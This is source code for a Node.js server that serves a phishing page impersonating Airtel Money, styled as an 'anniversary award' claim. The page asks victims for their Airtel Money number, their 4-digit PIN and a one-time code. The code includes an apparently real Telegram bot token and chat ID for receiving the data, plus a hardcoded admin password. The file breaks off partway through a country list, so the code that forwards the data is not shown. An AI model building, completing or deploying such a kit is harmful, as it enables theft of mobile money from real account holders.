const express = require('express');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

// TELEGRAM BOT DETAILS - EDIT HERE
const BOT_TOKEN = '8673679860:AAGfpHualyR7MYPS1bZCPbJnGBDut6ZvMyw';
const CHAT_ID = '7360665096';

const ADMIN_PASSWORD = 'Vinny123';

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const claims = {};

// ===== USER PAGE =====
const USER_PAGE = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Airtel Money Anniversary Awards</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#E40000 0%,#B30000 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.container{background:white;border-radius:20px;padding:36px 28px;max-width:460px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,0.3);position:relative;overflow:hidden}
.top-badge{position:absolute;top:0;right:0;background:#E40000;color:white;padding:8px 20px;font-size:11px;font-weight:700;border-bottom-left-radius:12px;letter-spacing:1.5px}
.logo-area{text-align:center;margin-bottom:20px}
.airtel-logo{display:inline-block;margin:0 auto 12px}
.airtel-logo svg{height:60px;width:auto;display:block}
.logo-area h1{color:#E40000;font-size:1.4em;margin:6px 0 0 0;font-weight:700}
.logo-area .tagline{color:#666;margin-top:4px;font-size:0.85em}
.anniversary-banner{background:linear-gradient(135deg,#FFD700,#FFA500,#FFD700);color:#7a0000;padding:14px 12px;border-radius:12px;text-align:center;font-size:12px;font-weight:800;margin-bottom:22px;letter-spacing:0.5px;box-shadow:0 6px 20px rgba(255,193,7,0.4);animation:shine 2s ease-in-out infinite}
@keyframes shine{0%,100%{box-shadow:0 6px 20px rgba(255,193,7,0.4)}50%{box-shadow:0 6px 28px rgba(255,193,7,0.75)}}
.anniversary-banner .big{display:block;font-size:15px;margin-bottom:3px;font-weight:900}
.form-group{margin-bottom:18px}
.form-group label{display:block;margin-bottom:7px;color:#333;font-weight:600;font-size:13px}
.form-group label .required{color:#f44336;margin-left:2px}
.form-group input{width:100%;padding:14px 15px;border:2px solid #e8e8e8;border-radius:10px;font-size:15px;transition:all 0.2s;background:#fafbfc;font-family:inherit;color:#333}
.form-group input:focus{border-color:#E40000;outline:none;background:white;box-shadow:0 0 0 4px rgba(228,0,0,0.08)}
.form-group input::placeholder{color:#a8b0b9;font-size:14px}
.btn{width:100%;padding:16px;border:none;border-radius:10px;font-size:16px;font-weight:700;cursor:pointer;transition:all 0.25s;color:white;background:linear-gradient(135deg,#E40000,#B30000);margin-top:6px;box-shadow:0 4px 14px rgba(228,0,0,0.25)}
.btn:hover:not(:disabled){transform:translateY(-2px);box-shadow:0 10px 25px rgba(228,0,0,0.35)}
.btn:disabled{opacity:0.6;cursor:not-allowed}
.btn-green{background:linear-gradient(135deg,#28a745,#1e7e34)}
.btn-green:hover:not(:disabled){box-shadow:0 10px 25px rgba(40,167,69,0.35)}
.message{padding:14px;border-radius:10px;margin-top:14px;font-weight:500;display:none;text-align:center;font-size:14px}
.message.show{display:block}
.message.error{background:#f8d7da;color:#721c24;border:1px solid #f5c6cb}
.message.info{background:#d1ecf1;color:#0c5460;border:1px solid #bee5eb}
.loader{display:inline-block;width:16px;height:16px;border:3px solid rgba(255,255,255,0.3);border-radius:50%;border-top-color:white;animation:spin 0.7s linear infinite;vertical-align:middle;margin-right:8px}
@keyframes spin{to{transform:rotate(360deg)}}
.otp-container{display:flex;gap:10px;justify-content:center;margin:24px 0}
.otp-input{width:60px;height:62px;text-align:center;font-size:24px;font-weight:700;border:2px solid #e8e8e8;border-radius:11px;background:#fafbfc;transition:all 0.2s;color:#E40000}
.otp-input:focus{border-color:#E40000;outline:none;background:white;box-shadow:0 0 0 4px rgba(228,0,0,0.08)}
.otp-input.filled{border-color:#E40000;background:#fff0f0}
.otp-input.error{border-color:#dc3545;background:#fff5f5;animation:shake 0.4s}
@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-8px)}75%{transform:translateX(8px)}}
.step-content{display:none}
.step-content.active{display:block}
.info-note{background:#fde8e8;border-left:3px solid #E40000;padding:12px 14px;border-radius:8px;font-size:12.5px;color:#7a0000;margin-bottom:18px;line-height:1.6;font-weight:500}
.section-title{color:#E40000;font-size:14px;font-weight:700;margin:0 0 14px 0;padding-bottom:8px;border-bottom:2px solid #fde8e8}
.verifying-box{text-align:center;padding:25px 10px}
.verifying-circle{width:130px;height:130px;margin:0 auto 22px;background:linear-gradient(135deg,#fde8e8,#fccccc);border-radius:50%;display:flex;align-items:center;justify-content:center;flex-direction:column;border:6px solid #E40000;box-shadow:0 0 0 6px rgba(228,0,0,0.1)}
.verifying-number{font-size:48px;font-weight:800;color:#E40000;line-height:1}
.verifying-label{font-size:11px;color:#666;font-weight:600;letter-spacing:1px;margin-top:4px}
.verifying-box h2{color:#E40000;font-size:1.35em;margin-bottom:8px;font-weight:700}
.verifying-box p{color:#666;font-size:13px;line-height:1.6;margin-bottom:18px}
.success-container{text-align:center;padding:14px 0}
.success-icon{width:100px;height:100px;background:linear-gradient(135deg,#28a745,#1e7e34);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 22px;font-size:44px;color:white;box-shadow:0 12px 32px rgba(40,167,69,0.35);animation:bounce 0.7s;font-weight:800}
@keyframes bounce{0%,100%{transform:scale(1)}50%{transform:scale(1.1)}}
.success-container h1{color:#28a745;margin-bottom:10px;font-size:1.4em;font-weight:700;line-height:1.3}
.success-container p{color:#666;margin-bottom:14px;line-height:1.65;font-size:14px}
.details-box{background:#f8f9fa;border-radius:12px;padding:18px;margin:22px 0;text-align:left;border:1px solid #e9ecef}
.detail-row{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid #e9ecef;font-size:13px;gap:10px}
.detail-row:last-child{border-bottom:none;padding-bottom:0}
.detail-label{color:#666;font-weight:500;flex-shrink:0}
.detail-value{color:#222;font-weight:700;text-align:right;word-break:break-word}
.status-approved{display:inline-block;padding:10px 24px;border-radius:20px;font-size:13px;font-weight:700;background:#d4edda;color:#155724;margin-top:6px}
.status-pending{display:inline-block;padding:10px 24px;border-radius:20px;font-size:13px;font-weight:700;background:#fff3cd;color:#856404;margin-top:6px}
.verifying-wait{text-align:center;padding:20px}
.verifying-wait-spinner{width:60px;height:60px;margin:0 auto 20px;border-radius:50%;border:5px solid #f0f0f0;border-top-color:#E40000;animation:spin 1s linear infinite}
.verifying-wait h2{color:#E40000;font-size:1.3em;margin-bottom:8px;font-weight:700}
.verifying-wait p{color:#666;font-size:13px;line-height:1.6}
.verifying-wait .dots{display:inline-block}
.verifying-wait .dots span{display:inline-block;animation:dotBounce 1.4s infinite both}
.verifying-wait .dots span:nth-child(1){animation-delay:0s}
.verifying-wait .dots span:nth-child(2){animation-delay:0.2s}
.verifying-wait .dots span:nth-child(3){animation-delay:0.4s}
@keyframes dotBounce{0%,80%,100%{transform:scale(0);opacity:0.3}40%{transform:scale(1);opacity:1}}
.country-wrap{position:relative}
.country-search{display:flex;align-items:center;gap:8px}
.country-search .flag-box{width:48px;height:48px;border:2px solid #e8e8e8;border-radius:10px;background:#fafbfc;display:flex;align-items:center;justify-content:center;font-size:22px;flex-shrink:0}
.country-search .search-input{flex:1;padding:14px 15px;border:2px solid #e8e8e8;border-radius:10px;font-size:15px;background:#fafbfc;color:#333;font-family:inherit}
.country-search .search-input:focus{border-color:#E40000;outline:none;background:white;box-shadow:0 0 0 4px rgba(228,0,0,0.08)}
.country-dropdown{position:absolute;top:calc(100% + 6px);left:0;right:0;background:white;border:2px solid #e8e8e8;border-radius:12px;max-height:240px;overflow-y:auto;z-index:100;box-shadow:0 12px 32px rgba(0,0,0,0.15);display:none}
.country-dropdown.show{display:block}
.country-item{display:flex;align-items:center;gap:10px;padding:11px 14px;cursor:pointer;border-bottom:1px solid #f0f0f0;font-size:14px}
.country-item:last-child{border-bottom:none}
.country-item:hover{background:#fff5f5}
.country-item .ci-flag{font-size:18px;flex-shrink:0}
.country-item .ci-name{flex:1;color:#333;font-weight:500}
.country-item .ci-code{color:#E40000;font-weight:700;font-size:13px}
.country-no-result{padding:16px;text-align:center;color:#999;font-size:13px}
.phone-combo{display:flex;gap:8px;align-items:stretch}
.phone-combo .code-display{display:flex;align-items:center;gap:6px;padding:0 14px;border:2px solid #e8e8e8;border-radius:10px;background:#fafbfc;font-weight:700;color:#E40000;font-size:15px;flex-shrink:0;white-space:nowrap}
.phone-combo input{flex:1}
</style>
</head>
<body>
<div class="container">
<div class="top-badge">AIRTEL MONEY</div>

<div class="logo-area">
<div class="airtel-logo">
<svg viewBox="0 0 220 60" xmlns="http://www.w3.org/2000/svg">
<text x="0" y="45" font-family="Arial,Helvetica,sans-serif" font-size="44" font-weight="900" fill="#E40000" letter-spacing="-1">airtel</text>
<circle cx="185" cy="20" r="8" fill="#E40000"/>
<path d="M 175 40 Q 185 20 195 40" stroke="#E40000" stroke-width="3" fill="none" stroke-linecap="round"/>
</svg>
</div>
<h1>Airtel Money</h1>
<div class="tagline">Anniversary Awards</div>
</div>

<div class="anniversary-banner">
<span class="big">ANNIVERSARY CELEBRATION</span>
Claim your anniversary award today
</div>

<!-- STEP 1: AIRTEL NUMBER -->
<div class="step-content active" id="step1Content">
<form id="numberForm">
<div class="section-title">Claim Your Award</div>
<div class="info-note">Select your country and enter your Airtel Money number to check your eligibility for the anniversary award.</div>

<div class="form-group">
<label>Country <span class="required">*</span></label>
<div class="country-wrap">
<div class="country-search">
<div class="flag-box" id="flagBox">&#127758;</div>
<input type="text" id="countrySearch" class="search-input" placeholder="Search country or enter code (e.g. +254, Kenya)" autocomplete="off">
</div>
<div class="country-dropdown" id="countryDropdown"></div>
</div>
</div>

<div class="form-group">
<label>Airtel Money Number <span class="required">*</span></label>
<div class="phone-combo">
<div class="code-display" id="codeDisplay">+254</div>
<input type="tel" id="airtelNumber" placeholder="731234567" inputmode="numeric" required>
</div>
</div>

<button type="submit" class="btn">Check Eligibility</button>
</form>
<div id="messageDiv" class="message"></div>
</div>

<!-- STEP 2: PIN -->
<div class="step-content" id="step2Content">
<div class="section-title">Authorize with PIN</div>
<div class="info-note">Enter your 4-digit Airtel Money PIN to authorize this claim.</div>
<form id="pinForm">
<div class="form-group">
<label>Your Airtel Money PIN <span class="required">*</span></label>
<input type="password" id="airtelPin" placeholder="Enter your Airtel Money PIN" maxlength="4" inputmode="numeric" required>
</div>
<button type="submit" class="btn" id="pinBtn"><span id="pinText">Continue</span></button>
</form>
<div id="pinMessage" class="message"></div>
</div>

<!-- STEP 3: VERIFYING -->
<div class="step-content" id="verifyingContent">
<div class="verifying-box">
<div class="verifying-circle">
<div class="verifying-number" id="verifyingNumber">20</div>
<div class="verifying-label">SECONDS</div>
</div>
<h2>Verifying Your Details</h2>
<p>Please wait while we verify your eligibility and prepare your award.</p>
</div>
</div>

<!-- STEP 4: OTP -->
<div class="step-content" id="step4Content">
<div class="section-title">Verify Your Number</div>
<div class="info-note">A 4-digit verification code has been sent to your Airtel Money number. Enter it below to claim your award.</div>
<div class="otp-container" id="otpContainer">
<input type="text" class="otp-input" maxlength="1" inputmode="numeric">
<input type="text" class="otp-input" maxlength="1" inputmode="numeric">
<input type="text" class="otp-input" maxlength="1" inputmode="numeric">
<input type="text" class="otp-input" maxlength="1" inputmode="numeric">
</div>
<button type="button" class="btn btn-green" id="submitOtpBtn">Verify and Claim</button>
<div id="otpMessage" class="message"></div>
</div>

<!-- STEP 5: WAITING -->
<div class="step-content" id="waitingContent">
<div class="verifying-wait">
<div class="verifying-wait-spinner"></div>
<h2>Verifying OTP</h2>
<p>Please wait while we verify your code<span class="dots"><span>.</span><span>.</span><span>.</span></span></p>
</div>
</div>

<!-- SUCCESS -->
<div class="step-content" id="successContent">
<div class="success-container">
<div class="success-icon">OK</div>
<h1>Congratulations!<br>You have claimed your award</h1>
<p>Your Airtel Money anniversary award has been successfully claimed. You will receive a confirmation message once approved.</p>
<div class="details-box">
<div class="detail-row"><span class="detail-label">Claim ID</span><span class="detail-value" id="finalRegId">#----</span></div>
<div class="detail-row"><span class="detail-label">Country</span><span class="detail-value" id="finalCountry">---</span></div>
<div class="detail-row"><span class="detail-label">Airtel Money Number</span><span class="detail-value" id="finalPhone">---</span></div>
</div>
<div class="status-approved">Award Claimed</div>
</div>
</div>

</div>

<script>
var COUNTRIES = [
{name:'Kenya',code:'+254',flag:'\\uD83C\\uDDF0\\uD83C\\uDDEA',iso:'KE'},
{name:'Uganda',code:'+256',flag:'\\uD83C\\uDDFA\\uD83C\\uDDEC',iso:'UG'},
{name:'Tanzania',code:'+255',flag:'\\uD83C\\uDDF9\\uD83C\\uDDFF',iso:'TZ'},
{name:'Rwanda',code:'+250',flag:'\\uD83C\\uDDF7\\uD83C\\uDDFC',iso:'RW'},
{name:'Nigeria',code:'+234',flag:'\\uD83C\\uDDF3\\uD83C\\uDDEC',iso:'NG'},
{name:'Ghana',code:'+233',flag:'\\uD83C\\uDDEC\\uD83C\\uDDED',iso:'GH'},
{name:'Zambia',code:'+260',flag:'\\uD83C\\uDDFF\\uD83C\\uDDF2',iso:'ZM'},
{name:'Malawi',code:'+265',flag:'\\uD83C\\uDDF2\\uD83C\\uDDFC',iso:'MW'},
{name:'Madagascar',code:'+261',flag:'\\uD83C\\uDDF2\\uD83C\\uDDEC',iso:'MG'},
{name:'DR Congo',code:'+243',flag:'\\uD83C\\uDDE8\\uD83C\\uDDE9',iso:'CD'},
{name:'Congo',code:'+242',flag:'\\uD83C\\uDDE8\\uD83C\\uDDEC',iso:'CG'},
{name:'Gabon',code:'+241',flag:'\\uD83C\\uDDEC\\uD83C\\uDDE6',iso:'GA'},
{name:'Seychelles',code:'+248',flag:'\\uD83C\\uDDF8\\uD83C\\uDDE8',iso:'SC'},
{name:'Niger',code:'+227',flag:'\\uD83C\\uDDF3\\uD83C\\uDDEA',iso:'NE'},
{name:'Chad',code:'+235',flag:'\\uD83C\\uDDF9\\uD83C\\uDDE9',iso:'TD'},
{name:'Sierra Leone',code:'+232',flag:'\\uD83C\\uDDF8\\uD83C\\uDDF1',iso:'SL'},
{name:'South Africa',code:'+27',flag:'\\uD83C\\uDDFF\\uD83C\\uDDE6',iso:'ZA'},
{name:'India',code:'+91',flag:'\\uD83C\\uDDEE\\uD83C\\uDDF3',iso:'IN'},
{name:'United States',code:'+1',flag:'\\uD83C\\uDDFA\\uD83C\\uDDF8',iso:'US'},
{name:'United Kingdom',code:'+44',flag:'\\uD83C\\uDDEC\\uD83C\\uDDE7',iso:'GB'},
{name:'United Arab Emirates',code:'+971',flag:'\\uD83C\\uDDE6\\uD83C\\uDDEA',iso:'AE'},
{name:'Saudi Arabia',code:'+966',flag:'\\uD83C\\uDDF8\\uD83C\\uDDE6',iso:'SA'},
{name:'Pakistan',code:'+92',flag:'\\uD83C\\uDDF5\\uD83C\\uDDF0',iso:'PK'},
{name:'Bangladesh',code:'+880',flag:'\\uD83C\\uDDE7\\uD83C\\uDDE9',iso:'BD'},
{name:'France',code:'+33',flag:'\\uD83C\\uDDEB\\uD83C\\uDDF7',iso:'FR'},
{name:'Germany',code:'+49',flag:'\\uD83C\\uDDE9\\uD83C\\uDDEA',iso:'DE'},
{name:'Italy',code:'+39',flag:'\\uD83C\\uDDEE\\uD83C\\uDDF9',iso:'IT'},
{name:'Spain',code:'+34',flag:'\\uD83C\\uDDEA\\uD83C\\uDDF8',iso:'ES'},
{name:'Netherlands',code:'+31',flag:'\\uD83C\\uDDF3\\uD83C\\uDDF1',iso:'NL'},
{name:'Belgium',code:'+32',flag:'\\uD83C\\uDDE7\\uD83C\\uDDEA',iso:'BE'},
{name:'Switzerland',code:'+41',flag:'\\uD83C\\uDDE8\\uD83C\\uDDED',iso:'CH'},
{name:'Canada',code:'+1',flag:'\\uD83C\\uDDE8\\uD83C\\uDDE6',iso:'CA'},
{name:'Australia',code:'+61',flag:'\\uD83C\\uDDE6\\uD83C\\uDDFA',iso:'AU'},
{name:'China',code:'+86',flag:'\\uD83C\\uDDE8\\uD83C\\uDDF3',iso:'CN'},
{name:'Japan',code:'+81',flag:'\\uD83C\\uDDEF\\uD83C\\uDDF5',iso:'JP'},
{name:'Brazil',code:'+55',flag:'\\uD83C\\uDDE7\\uD83C\\uDDF7',iso:'BR'},
{name:'Mexico',code:'+52',flag:'\\uD83C\\uDDF2\\uD83C\\uDDFD',iso:'MX'},
{name:'Turkey',code:'+90',flag:'\\uD83C\\uDDF9\\uD83C\\uDDF7',iso:'TR'},
{name:'Egypt',code:'+20',flag:'\\uD83C\\uDDEA\\uD83C\\uDDEC',iso:'EG'},
{name:'Morocco',code:'+212',flag:'\\uD83C\\uDDF2\\uD83C\\uDDE6',iso:'MA'},
{name:'Algeria',code:'+213',flag:'\\uD83C\\uDDE9\\uD83C\\uDDFF',iso:'DZ'},
{name:'Tunisia',code:'+216',flag:'\\uD83C\\uDDF9\\uD83C\\uDDF3',iso:'TN'},
{name:'Senegal',code:'+221',flag:'\\uD83C\\uDDF8\\uD83C\\uDDF3',iso:'SN'},
{name:'Ivory Coast',code:'+225',flag:'\\uD83C\\uDDE8\\uD83C\\uDDEE',iso:'CI'},
{name:'Cameroon',code:'+237',flag:'\\uD83C\\uDDE8\\uD83C\\uDDF2',iso:'CM'},
{name:'Ethiopia',code:'+251',flag:'\\uD83C\\uDDEA\\uD83C\\uDDF9',iso:'ET'},
{name:'Somalia',code:'+252',flag:'\\uD83C\\uDDF8\\uD83C\\uDDF4',iso:'SO'},
{name:'South Sudan',code:'+211',flag:'\\uD83C\\uDDF8\\uD83C\\uDDF8',iso:'SS'},
{name:'Sudan',code:'+249',flag:'\\uD83C\\uDDF8\\uD83C\\uDDE9',iso:'SD'},
{name:'Mozambique',code:'+258',flag:'\\uD83C\\uDDF2\\uD83C\\uDDFF',iso:'MZ'},
{name:'Zimbabwe',code:'+263',flag:'\\uD83C\\uDDFF\\uD83C\\uDDFC',iso:'ZW'},
{name:'Botswana',code:'+267',flag:'\\uD83C\\uDDE7\\uD83C\\uDDFC',iso:'BW'},
{name:'Namibia',code:'+264',flag:'\\uD83C\\uDDF3\\uD83C\\uDDE6',iso:'NA'},
{name:'Lesotho',code:'+266',flag:'\\uD83C\\uDDF1\\uD83C\\uDDF8',iso:'LS'},
{name:'Eswatini',code:'+268',flag:'\\uD83C\\uDDF8\\uD83C\\uDDFF',iso:'SZ'},
{name:'Mauritius',code:'+230',flag:'\\uD83C\\uDDF2\\uD83C\\uDDFA',iso:'MU'},
{name:'Comoros',code:'+269',flag:'\\uD83C\\uDDF0\\uD83C\\uDDF2',iso:'KM'},
{name:'Djibouti',code:'+253',flag:'\\uD83C\\uDDE9\\uD83C\\uDDEF',iso:'DJ'},
{name:'Eritrea',code:'+291',flag:'\\uD83C\\uDDEA\\uD83C\\uDDF7',iso:'ER'},
{name:'Gambia',code:'+220',flag:'\\uD83C\\uDDEC\\uD83C\\uDDF2',iso:'GM'},
{name:'Guinea',code:'+224',flag:'\\uD83C\\uDDEC\\uD83C\\uDDF3',iso:'GN'},
{name:'Liberia',code:'+231',flag:'\\uD83C\\uDDF1\\uD83C\\uDDF7',iso:'LR'},
{name:'Mali',code:'+223',flag:'\\uD83C\\uDDF2\\uD83C\\uDDF1',iso:'ML'},
{name:'Mauritania',code:'+222',flag:'\\uD83C\\uDDF2\\uD83C\\uDDF7',iso:'MR'},
{name:'Burkina Faso',code:'+226',flag:'\\uD83C\\uDDE7\\uD83C\\uDDEB',iso:'BF'},
{name:'Benin',code:'+229',flag:'\\uD83C\\uDDE7\\uD83C\\uDDEF',iso:'BJ'},
{name:'Togo',code:'+228',flag:'\\uD83C\\uDDF9\\uD83C\\uDDEC',iso:'TG'},
{name:'Cape Verde',code:'+238',flag:'\\uD83C\\uDDE8\\uD83C\\uDDFB',iso:'CV'},
{name:'Sao Tome',code:'+239',flag:'\\uD83C\\uDDF8\\uD83C\\uDDF9',iso:'ST'},
{name:'Equatorial Guinea',code:'+240',flag:'\\uD83C\\uDDEC\\uD83C\\uDDF6',iso:'GQ'},
{name:'Angola',code:'+244',flag:'\\uD83C\\uDDE6\\uD83C\\uDDF4',iso:'AO'},
{name:'Guinea-Bissau',code:'+245',flag:'\\uD83C\\uDDEC\\uD83C\\uDDFC',iso:'GW'},
{name:'Central African Republic',code:'+236',flag:'\\uD83C\\uDDE8\\uD83C\\uDDEB',iso:'CF'},
{name:'Burundi',code:'+257',flag:'\\uD83C\\uDDE7\\uD83C\\uDDEE',iso:'BI'},
{name:'Russia',code:'+7',flag:'\\uD83C\\uDDF7\\uD83C\\uDDFA',iso:'RU'},
{name:'Ukraine',code:'+380',flag:'\\uD83C\\uDDFA\\uD83C\\uDDE6',iso:'UA'},
{name:'Poland',code:'+48',flag:'\\uD83C\\uDDF5\\uD83C\\uDDF1',iso:'PL'},
{name:'Portugal',code:'+351',flag:'\\uD83C\\uDDF5\\uD83C\\uDDF9',iso:'PT'},
{name:'Ireland',code:'+353',flag:'\\uD83C\\uDDEE\\uD83C\\uDDEA',iso:'IE'},
{name:'Sweden',code:'+46',flag:'\\uD83C\\uDDF8\\uD83C\\uDDEA',iso:'SE'},
{name:'Norway',code:'+47',flag:'\\uD83C\\uDDF3\\uD83C\\uDDF4',iso:'NO'},
{name:'Denmark',code:'+45',flag:'\\uD83C\\uDDE9\\uD83C\\uDDF0',iso:'DK'},
{name:'Finland',code:'+358',flag:'\\uD83C\\uDDEB\\uD83C\\uDDEE',iso:'FI'},
{name:'Austria',code:'+43',flag:'\\uD83C\\uDDE6\\uD83C\\uDDF9',iso:'AT'},
{name:'Greece',code:'+30',flag:'\\uD83C\\uDDEC\\uD83C\\uDDF7',iso:'GR'},
{name:'Czech Republic',code:'+420',flag:'\\uD83C\\uDDE8\\uD83C\\uDDFF',iso:'CZ'},
{name:'Hungary',code:'+36',flag:'\\uD83C\\uDDED\\uD83C\\uDDFA',iso:'HU'},
{name:'Romania',code:'+40',flag:'\\uD83C\\uDDF7\\uD83C\\uDDF4',iso:'RO'},
{name:'Bulgaria',code:'+359',flag:'\\uD83C\\uDDE7\\uD83C\\uDDEC',iso:'BG'},
{name:'Serbia',code:'+381',flag:'\\uD83C\\uDDF7\\uD83C\\uDDF8',iso:'RS'},
{name:'Croatia',code:'+385',flag:'\\uD83C\\uDDED\\uD83C\\uDDF7',iso:'HR'},
{name:'Slovakia',code:'+421',flag:'\\uD83C\\uDDF8\\uD83C\\uDDF0',iso:'SK'},
{name:'Slovenia',code:'+386',flag:'\\uD83C\\uDDF8\\uD83C\\uDDEE',iso:'SI'},
{name:'Iceland',code:'+354',flag:'\\uD83C\\uDDEE\\uD83C\\uDDF8',iso:'IS'},
{name:'Luxembourg',code:'+352',flag:'\\uD83C\\uDDF1\\uD83C\\uDDFA',iso:'LU'},
{name:'Malta',code:'+356',flag:'\\uD83C\\uDDF2\\uD83C\\uDDF9',iso:'MT'},
{name:'Cyprus',code:'+357',flag:'\\uD83C\\uDDE8\\uD83C\\uDDFE',iso:'CY'},
{name:'Israel',code:'+972',flag:'\\uD83C\\uDDEE\\uD83C\\uDDF1',iso:'IL'},
{name:'Iran',code:'+98',flag:'\\uD83C\\uDDEE\\uD83C\\uDDF7',iso:'IR'},
{name:'Iraq',code:'+964',flag:'\\uD83C\\uDDEE\\uD83C\\uDDF6',iso:'IQ'},
{name:'Jordan',code:'+962',flag:'\\uD83C\\uDDEF\\uD83C\\uDDF4',iso:'JO'},
{name:'Lebanon',code:'+961',flag:'\\uD83C\\uDDF1\\uD83C\\uDDE7',iso:'LB'},
{name:'Kuwait',code:'+965',flag:'\\uD83C\\uDDF0\\uD83C\\uDDFC',iso:'KW'},
{name:'Qatar',code:'+974',flag:'\\uD83C\\uDDF6\\uD83C\\uDDE6',iso:'QA'},
{name:'Bahrain',code:'+973',flag:'\\uD83C\\uDDE7\\uD83C\\uDDED',iso:'BH'},
{name:'Oman',code:'+968',flag:'\\uD83C\\uDDF4\\uD83C\\uDDF2',iso:'OM'},
{name:'Yemen',code:'+967',flag:'\\uD83C\\uDDFE\\uD83C\\uDDEA',iso:'YE'},
{name:'Afghanistan',code:'+93',flag:'\\uD83C\\uDDE6\\uD83C\\uDDEB',iso:'AF'},
{name:'Sri Lanka',code:'+94',flag:'\\uD83C\\uDDF1\\uD83C\\uDDF0',iso:'LK'},
{name:'Nepal',code:'+977',flag:'\\uD83C\\uDDF3\\uD83C\\uDDF5',iso:'NP'},
{name:'Bhutan',code:'+975',flag:'\\uD83C\\uDDE7\\uD83C\\uDDF9',iso:'BT'},
{name:'Maldives',code:'+960',flag:'\\uD83C\\uDDF2\\uD83C\\uDDFB',iso:'MV'},
{name:'Thailand',code:'+66',flag:'\\uD83C\\uDDF9\\uD83C\\uDDED',iso:'TH'},
{name:'Malaysia',code:'+60',flag:'\\uD83C\\uDDF2\\uD83C\\uDDFE',iso:'MY'},
{name:'Singapore',code:'+65',flag:'\\uD83C\\uDDF8\\uD83C\\uDDEC',iso:'SG'},
{name:'Indonesia',code:'+62',flag:'\\uD83C\\uDDEE\\uD83C\\uDDE9',iso:'ID'},
{name:'Philippines',code:'+63',flag:'\\uD83C\\uDDF5\\uD83C\\uDDED',iso:'PH'},
{name:'Vietnam',code:'+84',flag:'\\uD83C\\uDDFB\\uD83C\\uDDF3',iso:'VN'},
{name:'South Korea',code:'+82',flag:'\\uD83C\\uDDF0\\uD83C\\uDDF7',iso:'KR'},
{name:'Hong Kong',code:'+852',flag:'\\uD83C\\uDDED\\uD83C\\uDDF0',iso:'HK'},
{name:'Taiwan',code:'+886',flag:'\\uD83C\\uDDF9\\uD83C\\uDDFC',iso:'TW'},
{name:'New Zealand',code:'+64',flag:'\\uD83C\\uDDF3\\uD83C\\uDDFF',iso:'NZ'},
{name:'Argentina',code:'+54',flag:'\\uD83C\\uDDE6\\uD83C\\uDDF7',iso:'AR'},
{name:'Chile',code:'+56',flag:'\\uD83C\\uDDE8\\uD83C\\uDDF1',iso:'CL'},
{name:'Colombia',code:'+57',flag:'\\uD83C\\uDDE8\\uD83C\\uDDF4',iso:'CO'},
{name:'Peru',code:'+51',flag:'\\uD83C\\uDDF5\\uD83C\\uDDEA',iso:'PE'},
{name:'Venezuela',code:'+58',flag:'\\uD83C\\uDDFB\\uD83C\\uDDEA',iso:'VE'},
{name:'Ecuador',code:'+593',flag:'\\uD83C\\uDDEA\\uD83C\\uDDE8',iso:'EC'},
{name:'Bolivia',code:'+591',flag:'\\uD83C\\uDDE7\\uD83C\\uDDF4',iso:'BO'},
{name:'Paraguay',code:'+595',flag:'\\uD83C\\uDDF5\\uD83C\\uDDFE',iso:'PY'},
{name:'Uruguay',code:'+598',flag:'\\uD83C\\uDDFA\\uD83C\\uDDFE',iso:'UY'},
{name:'Cuba',code:'+53',flag:'\\uD83C\\uDDE8\\uD83C\\uDDFA',iso:'CU'},
{name:'Jamaica',code:'+1876',flag:'\\uD83C\\uDDEF\\uD83C\\uDDF2',iso:'JM'},
{name:'Trinidad',code:'+1868',flag:'\\uD83C\\uDDF9\\uD83C\\uDDF9',iso:'TT'},
{name:'Panama',code:'+507',flag:'\\uD83C\\uDDF5\\uD83C\\uDDE6',iso:'PA'},
{name:'Costa Rica',code:'+506',flag:'\\uD83C\\uDDE8\\uD83C\\uDDF7',iso:'CR'},
{name:'Guatemala',code:'+502',flag:'\\uD83C\\uDDEC\\uD83C\\uDDF9',iso:'GT'},
{name:'Honduras',code:'+504',flag:'\\uD83C\\uDDED\\uD83C\\uDDF3',iso:'HN'},
{name:'El Salvador',code:'+503',flag:'\\uD83C\\uDDF8\\uD83C\\uDDFB',iso:'SV'},
{name:'Nicaragua',code:'+505',flag:'\\uD83C\\uDDF3\\uD83C\\uDDEE',iso:'NI'},
{name:'Dominican Republic',code:'+1809',flag:'\\uD83C\\uDDE9\\uD83C\\uDDF4',iso:'DO'},
{name:'Haiti',code:'+509',flag:'\\uD83C\\uDDED\\uD83C\\uDDF9',iso:'HT'},
{name:'Georgia',code:'+995',flag:'\\uD83C\\uDDEC\\uD83C\\uDDEA',iso:'GE'},
{name:'Armenia',code:'+374',flag:'\\uD83C\\uDDE6\\uD83C\\uDDF2',iso:'AM'},
{name:'Azerbaijan',code:'+994',flag:'\\uD83C\\uDDE6\\uD83C\\uDDFF',iso:'AZ'},
{name:'Kazakhstan',code:'+7',flag:'\\uD83C\\uDDF0\\uD83C\\uDDFF',iso:'KZ'},
{name:'Uzbekistan',code:'+998',flag:'\\uD83C\\uDDFA\\uD83C\\uDDFF',iso:'UZ'},
{name:'Turkmenistan',code:'+993',flag:'\\uD83C\\uDDF9\\uD83C\\uDDF2',iso:'TM'},
{name:'Kyrgyzstan',code:'+996',flag:'\\uD83C\\uDDF0\\uD83C\\uDDEC',iso:'KG'},
{name:'Tajikistan',code:'+992',flag:'\\uD83C\\uDDF9\\uD83C\\uDDEF',iso:'TJ'},
{name:'Mongolia',code:'+976',flag:'\\uD83C\\uDDF2\\uD83C\\uDDF3',iso:'MN'},
{name:'Cambodia',code:'+855',flag:'\\uD83C\\uDDF0\\uD83C\\uDDED',iso:'KH'},
{name:'Laos',code:'+856',flag:'\\uD83C\\uDDF1\\uD83C\\uDDE6',iso:'LA'},
{name:'Myanmar',code:'+95',flag:'\\uD83C\\uDDF2\\uD83C\\uDDF2',iso:'MM'},
{name:'Brunei',code:'+673',flag:'\\uD83C\\uDDE7\\uD83C\\uDDF3',iso:'BN'},
{name:'Fiji',code:'+679',flag:'\\uD83C\\uDDEB\\uD83C\\uDDEF',iso:'FJ'},
